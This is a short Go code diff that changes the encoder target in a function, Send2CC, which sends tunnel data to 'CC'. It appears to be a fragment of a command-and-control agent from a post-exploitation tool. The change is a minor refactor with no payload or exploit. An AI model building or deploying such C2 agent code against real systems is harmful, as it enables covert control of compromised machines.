@@ -176,7 +176,7 @@ func IsProcAlive(procName string) (alive bool, procs []*os.Process) {
 
 // Send2CC send TunData to CC
 func Send2CC(data *TunData) error {
-	var out = json.NewEncoder(H2Conn)
+	var out = json.NewEncoder(H2Json)
 
 	err := out.Encode(data)
 	if err != nil {
